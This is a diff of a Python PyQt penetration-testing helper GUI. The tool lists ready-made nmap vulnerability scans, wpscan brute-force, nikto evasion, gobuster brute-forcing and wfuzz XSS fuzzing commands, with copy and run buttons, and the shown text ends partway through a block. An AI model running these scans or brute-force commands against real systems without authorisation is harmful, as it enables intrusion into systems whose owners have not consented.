@@ -122,7 +122,7 @@ class MainWindow(QMainWindow):
 
 
     def recon(self):
-        rhost = "127.0.0.1"
+        self.rhost = "127.0.0.1"
         if not hasattr(self, 'tab1_container'):
             self.tab1_container = QWidget()
             self.tab1_container_layout = QVBoxLayout(self.tab1_container)
@@ -197,7 +197,7 @@ class MainWindow(QMainWindow):
         if hasattr(self, 'nmap_Scan2'):
             self.tab1_container_layout.removeWidget(self.nmap_Scan2)
             self.nmap_Scan2.deleteLater()
-        self.nmap_Scan2 = QLabel(f"nmap -p- -sC -sV {rhost} --open") 
+        self.nmap_Scan2 = QLabel(f"nmap -p- -sC -sV {self.rhost} --open") 
         self.nmap_Scan2.setStyleSheet(
             "color: 'white';" +
             "font-size: 20px;" +
@@ -241,7 +241,7 @@ class MainWindow(QMainWindow):
         if hasattr(self, 'nmap_Scan3'):
             self.tab1_container_layout.removeWidget(self.nmap_Scan3)
             self.nmap_Scan3.deleteLater()
-        self.nmap_Scan3 = QLabel(f"nmap -p- --script=vuln {rhost}")
+        self.nmap_Scan3 = QLabel(f"nmap -p- --script=vuln {self.rhost}")
         self.nmap_Scan3.setStyleSheet(
             "color: 'white';" +
             "font-size: 20px;" +
@@ -306,6 +306,7 @@ class MainWindow(QMainWindow):
         self.nmap_spacer1 = QLabel()
         self.nmap_spacer1.setFixedWidth(40)
         self.nmap_spacer1.setFixedHeight(40)
+        
         # nmap spacer2
         if hasattr(self, 'nmap_spacer2'):
             self.tab1_container_layout.removeWidget(self.nmap_spacer2)
@@ -323,8 +324,8 @@ class MainWindow(QMainWindow):
 ### HTTPHelper
     def httphelper(self):
         self.lport = "80"
-        rport = "4444"
-        rhost = "127.0.0.1"
+        self.rport = "4444"
+        self.rhost = "127.0.0.1"
         if not hasattr(self, 'tab2_container'):
             self.tab2_container = QWidget()
             self.tab2_container_layout = QVBoxLayout(self.tab2_container)
@@ -478,47 +479,48 @@ class MainWindow(QMainWindow):
         self.tab2_container_layout.insertLayout(3, label_layout)
         self.tab2_container_layout.addStretch()
 
-        # httphelper_divider 1
-        if hasattr(self, 'httphelper_divider1'):
-            self.tab2_container_layout.removeWidget(self.httphelper_divider1)
-            self.httphelper_divider1.deleteLater()
-        self.httphelper_divider1 = QFrame()
-        self.httphelper_divider1.setFrameShape(QFrame.HLine)
-        self.httphelper_divider1.setLineWidth(3)
-        self.httphelper_divider1.setStyleSheet("color: #20C20E;")
+        # httpMethods_divider 1
+        if hasattr(self, 'httpMethods_divider1'):
+            self.tab2_container_layout.removeWidget(self.httpMethods_divider1)
+            self.httpMethods_divider1.deleteLater()
+        self.httpMethods_divider1 = QFrame()
+        self.httpMethods_divider1.setFrameShape(QFrame.HLine)
+        self.httpMethods_divider1.setLineWidth(3)
+        self.httpMethods_divider1.setStyleSheet("color: #20C20E;")
         
-        # httphelper_divider2
-        if hasattr(self, 'httphelper_divider2'):
-            self.tab2_container_layout.removeWidget(self.httphelper_divider2)
-            self.httphelper_divider2.deleteLater()
-        self.httphelper_divider2 = QFrame()
-        self.httphelper_divider2.setFrameShape(QFrame.HLine)
-        self.httphelper_divider2.setLineWidth(3)
-        self.httphelper_divider2.setStyleSheet("color: #20C20E;")
+        # httpMethods_divider2
+        if hasattr(self, 'httpMethods_divider2'):
+            self.tab2_container_layout.removeWidget(self.httpMethods_divider2)
+            self.httpMethods_divider2.deleteLater()
+        self.httpMethods_divider2 = QFrame()
+        self.httpMethods_divider2.setFrameShape(QFrame.HLine)
+        self.httpMethods_divider2.setLineWidth(3)
+        self.httpMethods_divider2.setStyleSheet("color: #20C20E;")
         
-        # httphelper_spacer1
-        if hasattr(self, 'httphelper_spacer1'):
-            self.tab2_container_layout.removeWidget(self.httphelper_spacer1)
-            self.httphelper_spacer1.deleteLater()
-        self.httphelper_spacer1 = QLabel()
-        self.httphelper_spacer1.setFixedWidth(40)
-        self.httphelper_spacer1.setFixedHeight(40)
-        # httphelper_spacer2
-        if hasattr(self, 'httphelper_spacer2'):
-            self.tab2_container_layout.removeWidget(self.httphelper_spacer2)
-            self.httphelper_spacer2.deleteLater()
-        self.httphelper_spacer2 = QLabel()
-        self.httphelper_spacer2.setFixedWidth(40)
-        self.httphelper_spacer2.setFixedHeight(40)
+        # httpMethods_spacer1
+        if hasattr(self, 'httpMethods_spacer1'):
+            self.tab2_container_layout.removeWidget(self.httpMethods_spacer1)
+            self.httpMethods_spacer1.deleteLater()
+        self.httpMethods_spacer1 = QLabel()
+        self.httpMethods_spacer1.setFixedWidth(40)
+        self.httpMethods_spacer1.setFixedHeight(40)
+        
+        # httpMethods_spacer2
+        if hasattr(self, 'httpMethods_spacer2'):
+            self.tab2_container_layout.removeWidget(self.httpMethods_spacer2)
+            self.httpMethods_spacer2.deleteLater()
+        self.httpMethods_spacer2 = QLabel()
+        self.httpMethods_spacer2.setFixedWidth(40)
+        self.httpMethods_spacer2.setFixedHeight(40)
 
-        # httphelper_spacer & divider layout
-        self.tab2_container_layout.insertWidget(4, self.httphelper_spacer1)
-        self.tab2_container_layout.insertWidget(5, self.httphelper_divider1)
-        self.tab2_container_layout.insertWidget(6, self.httphelper_divider2)
-        self.tab2_container_layout.insertWidget(7, self.httphelper_spacer2)
+        # httpMethods_spacer & divider layout
+        self.tab2_container_layout.insertWidget(4, self.httpMethods_spacer1)
+        self.tab2_container_layout.insertWidget(5, self.httpMethods_divider1)
+        self.tab2_container_layout.insertWidget(6, self.httpMethods_divider2)
+        self.tab2_container_layout.insertWidget(7, self.httpMethods_spacer2)
         self.tab2_container_layout.addStretch()
-################################################################################
-        # WPScanSSL
+        
+# WPScanSSL
         if hasattr(self, 'wpscanSSL'):
             self.tab2_container_layout.removeWidget(self.wpscanSSL)
             self.wpscanSSL.deleteLater()
@@ -574,7 +576,18 @@ class MainWindow(QMainWindow):
         self.tab2_container_layout.insertLayout(9, label_layout)
         self.tab2_container_layout.addStretch()
 
-        # wpscanBF
+        # wpscanSSL_spacer1
+        if hasattr(self, 'wpscanSSL_spacer1'):
+            self.tab2_container_layout.removeWidget(self.wpscanSSL_spacer1)
+            self.wpscanSSL_spacer1.deleteLater()
+        self.wpscanSSL_spacer1 = QLabel()
+        self.wpscanSSL_spacer1.setFixedWidth(40)
+        self.wpscanSSL_spacer1.setFixedHeight(40)
+
+        # wpscanSSL_spacer & divider layout
+        self.tab2_container_layout.insertWidget(10, self.wpscanSSL_spacer1)
+
+# wpscanBF
         if hasattr(self, 'wpscanBF'):
             self.tab2_container_layout.removeWidget(self.wpscanBF)
             self.wpscanBF.deleteLater()
@@ -584,7 +597,7 @@ class MainWindow(QMainWindow):
             "font-size: 20px;" +
             "font-style: 'bold';"
         )
-        self.tab2_container_layout.insertWidget(10,self.wpscanBF)
+        self.tab2_container_layout.insertWidget(11,self.wpscanBF)
 
         # wpscanBF_Scan1
         if hasattr(self, 'wpscanBF_Scan1'):
@@ -627,10 +640,21 @@ class MainWindow(QMainWindow):
         label_layout.addWidget(self.wpscanBF_Scan1_Copy)
         label_layout.addWidget(self.wpscanBF_Scan1_Run)
         label_layout.addWidget(self.wpscanBF_Scan1)
-        self.tab2_container_layout.insertLayout(11, label_layout)
+        self.tab2_container_layout.insertLayout(12, label_layout)
         self.tab2_container_layout.addStretch()
-        
-        # wpscan Aggressive Plugin Detection
+
+        # wpscanBF_spacer1
+        if hasattr(self, 'wpscanBF_spacer1'):
+            self.tab2_container_layout.removeWidget(self.wpscanBF_spacer1)
+            self.wpscanBF_spacer1.deleteLater()
+        self.wpscanBF_spacer1 = QLabel()
+        self.wpscanBF_spacer1.setFixedWidth(40)
+        self.wpscanBF_spacer1.setFixedHeight(40)
+
+        # wpscanBF_spacer & divider layout
+        self.tab2_container_layout.insertWidget(13, self.wpscanBF_spacer1)
+
+# wpscan Aggressive Plugin Detection
         if hasattr(self, 'wpscanAPD'):
             self.tab2_container_layout.removeWidget(self.wpscanAPD)
             self.wpscanAPD.deleteLater()
@@ -640,12 +664,12 @@ class MainWindow(QMainWindow):
             "font-size: 20px;" +
             "font-style: 'bold';"
         )
-        self.tab2_container_layout.insertWidget(12,self.wpscanAPD)
+        self.tab2_container_layout.insertWidget(14,self.wpscanAPD)
 
         if hasattr(self, 'wpscanAPD_Scan1'):
             self.tab2_container_layout.removeWidget(self.wpscanAPD_Scan1)
             self.wpscanAPD_Scan1.deleteLater()
-        self.wpscanAPD_Scan1 = QLabel(f"wpscan --url http://{rhost}:{rport} --enumerate p --plugins-detection aggressive")
+        self.wpscanAPD_Scan1 = QLabel("wpscan --url http:// " + self.rhost + ":" + self.rport + " --enumerate p --plugins-detection aggressive")
         self.wpscanAPD_Scan1.setStyleSheet(
             "color: 'white';" +
             "font-size: 20px;" +
@@ -678,8 +702,1669 @@ class MainWindow(QMainWindow):
         label_layout.addWidget(self.wpscanAPD_Scan1_Copy)
         label_layout.addWidget(self.wpscanAPD_Scan1_Run)
         label_layout.addWidget(self.wpscanAPD_Scan1)
-        self.tab2_container_layout.insertLayout(13, label_layout)
+        self.tab2_container_layout.insertLayout(15, label_layout)
         self.tab2_container_layout.addStretch()
+
+        # wpscan_divider 1
+        if hasattr(self, 'wpscan_divider1'):
+            self.tab2_container_layout.removeWidget(self.wpscan_divider1)
+            self.wpscan_divider1.deleteLater()
+        self.wpscan_divider1 = QFrame()
+        self.wpscan_divider1.setFrameShape(QFrame.HLine)
+        self.wpscan_divider1.setLineWidth(3)
+        self.wpscan_divider1.setStyleSheet("color: #20C20E;")
+        
+        # wpscan_divider2
+        if hasattr(self, 'wpscan_divider2'):
+            self.tab2_container_layout.removeWidget(self.wpscan_divider2)
+            self.wpscan_divider2.deleteLater()
+        self.wpscan_divider2 = QFrame()
+        self.wpscan_divider2.setFrameShape(QFrame.HLine)
+        self.wpscan_divider2.setLineWidth(3)
+        self.wpscan_divider2.setStyleSheet("color: #20C20E;")
+        
+        # wpscan_spacer1
+        if hasattr(self, 'wpscan_spacer1'):
+            self.tab2_container_layout.removeWidget(self.wpscan_spacer1)
+            self.wpscan_spacer1.deleteLater()
+        self.wpscan_spacer1 = QLabel()
+        self.wpscan_spacer1.setFixedWidth(40)
+        self.wpscan_spacer1.setFixedHeight(40)
+
+        # wpscan_spacer2
+        if hasattr(self, 'wpscan_spacer2'):
+            self.tab2_container_layout.removeWidget(self.wpscan_spacer2)
+            self.wpscan_spacer2.deleteLater()
+        self.wpscan_spacer2 = QLabel()
+        self.wpscan_spacer2.setFixedWidth(40)
+        self.wpscan_spacer2.setFixedHeight(40)
+
+        # wpscan_spacer & divider layout
+        self.tab2_container_layout.insertWidget(16, self.wpscan_spacer1)
+        self.tab2_container_layout.insertWidget(17, self.wpscan_divider1)
+        self.tab2_container_layout.insertWidget(18, self.wpscan_divider2)
+        self.tab2_container_layout.insertWidget(19, self.wpscan_spacer2)
+        self.tab2_container_layout.addStretch()
+
+        # niktoSE
+        if hasattr(self, 'niktoSE'):
+            self.tab2_container_layout.removeWidget(self.niktoSE)
+            self.niktoSE.deleteLater()
+        self.niktoSE = QLabel("[+ Nikto with SSL and Evasion:]")
+        self.niktoSE.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(20,self.niktoSE)
+
+        # niktoSE_Scan1
+        if hasattr(self, 'niktoSE_Scan1'):
+            self.tab2_container_layout.removeWidget(self.niktoSE_Scan1)
+            self.niktoSE_Scan1.deleteLater()
+        self.niktoSE_Scan1 = QLabel(f"nikto --host http://{self.rhost}:{self.rport} -ssl -evasion 1")
+        self.niktoSE_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # niktoSE_Scan1 copy button
+        if hasattr(self, 'niktoSE_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.niktoSE_Scan1_Copy)
+            self.niktoSE_Scan1_Copy.deleteLater()
+        self.niktoSE_Scan1_Copy = QPushButton()
+        self.niktoSE_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.niktoSE_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.niktoSE_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.niktoSE_Scan1.text()))
+        self.niktoSE_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # niktoSE_Scan1 run button
+        if hasattr(self, 'niktoSE_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.niktoSE_Scan1_Run)
+            self.niktoSE_Scan1_Run.deleteLater()
+        self.niktoSE_Scan1_Run = QPushButton()
+        self.niktoSE_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.niktoSE_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.niktoSE_Scan1.text() + "; bash"
+        self.niktoSE_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.niktoSE_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # niktoSE_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.niktoSE_Scan1_Copy)
+        label_layout.addWidget(self.niktoSE_Scan1_Run)
+        label_layout.addWidget(self.niktoSE_Scan1)
+        self.tab2_container_layout.insertLayout(21, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # niktoSE_spacer1
+        if hasattr(self, 'niktoSE_spacer1'):
+            self.tab2_container_layout.removeWidget(self.niktoSE_spacer1)
+            self.niktoSE_spacer1.deleteLater()
+        self.niktoSE_spacer1 = QLabel()
+        self.niktoSE_spacer1.setFixedWidth(40)
+        self.niktoSE_spacer1.setFixedHeight(40)
+
+        # niktoSE_spacer & divider layout
+        self.tab2_container_layout.insertWidget(22, self.niktoSE_spacer1)
+
+# nikto
+        if hasattr(self, 'nikto'):
+            self.tab2_container_layout.removeWidget(self.nikto)
+            self.nikto.deleteLater()
+        self.nikto = QLabel("[+ Nikto Standard:]")
+        self.nikto.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(23,self.nikto)
+
+        # nikto_Scan1
+        if hasattr(self, 'nikto_Scan1'):
+            self.tab2_container_layout.removeWidget(self.nikto_Scan1)
+            self.nikto_Scan1.deleteLater()
+        self.nikto_Scan1 = QLabel(f"nikto --host http://{self.rhost}:{self.rport} -C all")
+        self.nikto_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # nikto_Scan1 copy button
+        if hasattr(self, 'nikto_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.nikto_Scan1_Copy)
+            self.nikto_Scan1_Copy.deleteLater()
+        self.nikto_Scan1_Copy = QPushButton()
+        self.nikto_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.nikto_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.nikto_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.nikto_Scan1.text()))
+        self.nikto_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # nikto_Scan1 run button
+        if hasattr(self, 'nikto_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.nikto_Scan1_Run)
+            self.nikto_Scan1_Run.deleteLater()
+        self.nikto_Scan1_Run = QPushButton()
+        self.nikto_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.nikto_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.nikto_Scan1.text() + "; bash"
+        self.nikto_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.nikto_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # nikto_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.nikto_Scan1_Copy)
+        label_layout.addWidget(self.nikto_Scan1_Run)
+        label_layout.addWidget(self.nikto_Scan1)
+        self.tab2_container_layout.insertLayout(24, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # nikto_divider1 
+        if hasattr(self, 'nikto_divider1'):
+            self.tab2_container_layout.removeWidget(self.nikto_divider1)
+            self.nikto_divider1.deleteLater()
+        self.nikto_divider1 = QFrame()
+        self.nikto_divider1.setFrameShape(QFrame.HLine)
+        self.nikto_divider1.setLineWidth(3)
+        self.nikto_divider1.setStyleSheet("color: #20C20E;")
+        
+        # nikto_divider2
+        if hasattr(self, 'nikto_divider2'):
+            self.tab2_container_layout.removeWidget(self.nikto_divider2)
+            self.nikto_divider2.deleteLater()
+        self.nikto_divider2 = QFrame()
+        self.nikto_divider2.setFrameShape(QFrame.HLine)
+        self.nikto_divider2.setLineWidth(3)
+        self.nikto_divider2.setStyleSheet("color: #20C20E;")
+        
+        # nikto_spacer1
+        if hasattr(self, 'nikto_spacer1'):
+            self.tab2_container_layout.removeWidget(self.nikto_spacer1)
+            self.nikto_spacer1.deleteLater()
+        self.nikto_spacer1 = QLabel()
+        self.nikto_spacer1.setFixedWidth(40)
+        self.nikto_spacer1.setFixedHeight(40)
+        
+        # nikto_spacer2
+        if hasattr(self, 'nikto_spacer2'):
+            self.tab2_container_layout.removeWidget(self.nikto_spacer2)
+            self.nikto_spacer2.deleteLater()
+        self.nikto_spacer2 = QLabel()
+        self.nikto_spacer2.setFixedWidth(40)
+        self.nikto_spacer2.setFixedHeight(40)
+
+        # nikto_spacer & divider layout
+        self.tab2_container_layout.insertWidget(25, self.nikto_spacer1)
+        self.tab2_container_layout.insertWidget(26, self.nikto_divider1)
+        self.tab2_container_layout.insertWidget(27, self.nikto_divider2)
+        self.tab2_container_layout.insertWidget(28, self.nikto_spacer2)
+        self.tab2_container_layout.addStretch()
+
+# gobusterDir
+        if hasattr(self, 'gobusterDir'):
+            self.tab2_container_layout.removeWidget(self.gobusterDir)
+            self.gobusterDir.deleteLater()
+        self.gobusterDir = QLabel("[+ Gobuster Directory]")
+        self.gobusterDir.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(29,self.gobusterDir)
+
+        # gobusterDir_Scan1
+        if hasattr(self, 'gobusterDir_Scan1'):
+            self.tab2_container_layout.removeWidget(self.gobusterDir_Scan1)
+            self.gobusterDir_Scan1.deleteLater()
+        self.gobusterDir_Scan1 = QLabel(f"gobuster dir -u http://{self.rhost}:{self.rport} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -l -k -t 30")
+        self.gobusterDir_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # gobusterDir_Scan1 copy button
+        if hasattr(self, 'gobusterDir_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.gobusterDir_Scan1_Copy)
+            self.gobusterDir_Scan1_Copy.deleteLater()
+        self.gobusterDir_Scan1_Copy = QPushButton()
+        self.gobusterDir_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.gobusterDir_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.gobusterDir_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.gobusterDir_Scan1.text()))
+        self.gobusterDir_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # gobusterDir_Scan1 run button
+        if hasattr(self, 'gobusterDir_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.gobusterDir_Scan1_Run)
+            self.gobusterDir_Scan1_Run.deleteLater()
+        self.gobusterDir_Scan1_Run = QPushButton()
+        self.gobusterDir_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.gobusterDir_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.gobusterDir_Scan1.text() + "; bash"
+        self.gobusterDir_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.gobusterDir_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # gobusterDir_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.gobusterDir_Scan1_Copy)
+        label_layout.addWidget(self.gobusterDir_Scan1_Run)
+        label_layout.addWidget(self.gobusterDir_Scan1)
+        self.tab2_container_layout.insertLayout(30, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # gobusterDir_spacer1
+        if hasattr(self, 'gobusterDir_spacer1'):
+            self.tab2_container_layout.removeWidget(self.gobusterDir_spacer1)
+            self.gobusterDir_spacer1.deleteLater()
+        self.gobusterDir_spacer1 = QLabel()
+        self.gobusterDir_spacer1.setFixedWidth(40)
+        self.gobusterDir_spacer1.setFixedHeight(40)
+
+        # gobusterDir_spacer & divider layout
+        self.tab2_container_layout.insertWidget(31, self.gobusterDir_spacer1)
+
+# gobusterFiles
+        if hasattr(self, 'gobusterFiles'):
+            self.tab2_container_layout.removeWidget(self.gobusterFiles)
+            self.gobusterFiles.deleteLater()
+        self.gobusterFiles = QLabel("[+ Gobuster Files]")
+        self.gobusterFiles.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(32,self.gobusterFiles)
+
+        # gobusterFiles_Scan1
+        if hasattr(self, 'gobusterFiles_Scan1'):
+            self.tab2_container_layout.removeWidget(self.gobusterFiles_Scan1)
+            self.gobusterFiles_Scan1.deleteLater()
+        self.gobusterFiles_Scan1 = QLabel(f"gobuster dir -u http://{self.rhost}:{self.rport} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -l -k -t 30")
+        self.gobusterFiles_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+
+        # gobusterFiles_Scan1 copy button
+        if hasattr(self, 'gobusterFiles_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.gobusterFiles_Scan1_Copy)
+            self.gobusterFiles_Scan1_Copy.deleteLater()
+        self.gobusterFiles_Scan1_Copy = QPushButton()
+        self.gobusterFiles_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.gobusterFiles_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.gobusterFiles_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.gobusterFiles_Scan1.text()))
+        self.gobusterFiles_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # gobusterFiles_Scan1 run button
+        if hasattr(self, 'gobusterFiles_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.gobusterFiles_Scan1_Run)
+            self.gobusterFiles_Scan1_Run.deleteLater()
+        self.gobusterFiles_Scan1_Run = QPushButton()
+        self.gobusterFiles_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.gobusterFiles_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.gobusterFiles_Scan1.text() + "; bash"
+        self.gobusterFiles_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.gobusterFiles_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # gobusterFiles_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.gobusterFiles_Scan1_Copy)
+        label_layout.addWidget(self.gobusterFiles_Scan1_Run)
+        label_layout.addWidget(self.gobusterFiles_Scan1)
+        self.tab2_container_layout.insertLayout(33, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # gobusterFiles_spacer1
+        if hasattr(self, 'gobusterFiles_spacer1'):
+            self.tab2_container_layout.removeWidget(self.gobusterFiles_spacer1)
+            self.gobusterFiles_spacer1.deleteLater()
+        self.gobusterFiles_spacer1 = QLabel()
+        self.gobusterFiles_spacer1.setFixedWidth(40)
+        self.gobusterFiles_spacer1.setFixedHeight(40)
+
+        # gobusterFiles_spacer & divider layout
+        self.tab2_container_layout.insertWidget(34, self.gobusterFiles_spacer1)
+
+# gobusterSub
+        if hasattr(self, 'gobusterSub'):
+            self.tab2_container_layout.removeWidget(self.gobusterSub)
+            self.gobusterSub.deleteLater()
+        self.gobusterSub = QLabel("[+ Gobuster for SubDomain Brute Forcing]")
+        self.gobusterSub.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(35,self.gobusterSub)
+
+        # gobusterSub_Scan1
+        if hasattr(self, 'gobusterSub_Scan1'):
+            self.tab2_container_layout.removeWidget(self.gobusterSub_Scan1)
+            self.gobusterSub_Scan1.deleteLater()
+        self.gobusterSub_Scan1 = QLabel(f"gobuster dns -d domain.org -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30")
+        self.gobusterSub_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+            )
+
+        # gobusterSub_Scan1 copy button
+        if hasattr(self, 'gobusterSub_Scan1_Copy'):
+            self.tab2_container_layout.removeWidget(self.gobusterSub_Scan1_Copy)
+            self.gobusterSub_Scan1_Copy.deleteLater()
+        self.gobusterSub_Scan1_Copy = QPushButton()
+        self.gobusterSub_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
+        self.gobusterSub_Scan1_Copy.setFixedSize(QSize(20,20))
+        self.gobusterSub_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.gobusterSub_Scan1.text()))
+        self.gobusterSub_Scan1_Copy.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # gobusterSub_Scan1 run button
+        if hasattr(self, 'gobusterSub_Scan1_Run'):
+            self.tab2_container_layout.removeWidget(self.gobusterSub_Scan1_Run)
+            self.gobusterSub_Scan1_Run.deleteLater()
+        self.gobusterSub_Scan1_Run = QPushButton()
+        self.gobusterSub_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
+        self.gobusterSub_Scan1_Run.setFixedSize(QSize(20,20))
+        command10 = self.gobusterSub_Scan1.text() + "; bash"
+        self.gobusterSub_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        self.gobusterSub_Scan1_Run.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )
+
+        # gobusterSub_Scan1 adding widgets
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(self.gobusterSub_Scan1_Copy)
+        label_layout.addWidget(self.gobusterSub_Scan1_Run)
+        label_layout.addWidget(self.gobusterSub_Scan1)
+        self.tab2_container_layout.insertLayout(36, label_layout)
+        self.tab2_container_layout.addStretch()
+
+        # gobuster_divider1 
+        if hasattr(self, 'gobuster_divider1'):
+            self.tab2_container_layout.removeWidget(self.gobuster_divider1)
+            self.gobuster_divider1.deleteLater()
+        self.gobuster_divider1 = QFrame()
+        self.gobuster_divider1.setFrameShape(QFrame.HLine)
+        self.gobuster_divider1.setLineWidth(3)
+        self.gobuster_divider1.setStyleSheet("color: #20C20E;")
+        
+        # gobuster_divider2
+        if hasattr(self, 'gobuster_divider2'):
+            self.tab2_container_layout.removeWidget(self.gobuster_divider2)
+            self.gobuster_divider2.deleteLater()
+        self.gobuster_divider2 = QFrame()
+        self.gobuster_divider2.setFrameShape(QFrame.HLine)
+        self.gobuster_divider2.setLineWidth(3)
+        self.gobuster_divider2.setStyleSheet("color: #20C20E;")
+        
+        # gobuster_spacer1
+        if hasattr(self, 'gobuster_spacer1'):
+            self.tab2_container_layout.removeWidget(self.gobuster_spacer1)
+            self.gobuster_spacer1.deleteLater()
+        self.gobuster_spacer1 = QLabel()
+        self.gobuster_spacer1.setFixedWidth(40)
+        self.gobuster_spacer1.setFixedHeight(40)
+        
+        # gobuster_spacer2
+        if hasattr(self, 'gobuster_spacer2'):
+            self.tab2_container_layout.removeWidget(self.gobuster_spacer2)
+            self.gobuster_spacer2.deleteLater()
+        self.gobuster_spacer2 = QLabel()
+        self.gobuster_spacer2.setFixedWidth(40)
+        self.gobuster_spacer2.setFixedHeight(40)
+
+        # gobuster_spacer & divider layout
+        self.tab2_container_layout.insertWidget(37, self.gobuster_spacer1)
+        self.tab2_container_layout.insertWidget(38, self.gobuster_divider1)
+        self.tab2_container_layout.insertWidget(39, self.gobuster_divider2)
+        self.tab2_container_layout.insertWidget(40, self.gobuster_spacer2)
+        self.tab2_container_layout.addStretch()
+
+        # wfuzzXSS
+        if hasattr(self, 'wfuzzXSS'):
+            self.tab2_container_layout.removeWidget(self.wfuzzXSS)
+            self.wfuzzXSS.deleteLater()
+        self.wfuzzXSS = QLabel("[+ Wfuzz XSS Fuzzing]")
+        self.wfuzzXSS.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.tab2_container_layout.insertWidget(41,self.wfuzzXSS)
+
+        # wfuzzXSS_Scan1
+        if hasattr(self, 'wfuzzXSS_Scan1'):
+            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan1)
+            self.wfuzzXSS_Scan1.deleteLater()
+        self.wfuzzXSS_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt http://{self.rhost}:{self.rport}/FUZZ")
+        self.wfuzzXSS_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+            )
+
+        # wfuzzXSS_Scan1 copy button
+        if hasattr(self, 'wfuzzXSS_Scan1_Copy'):
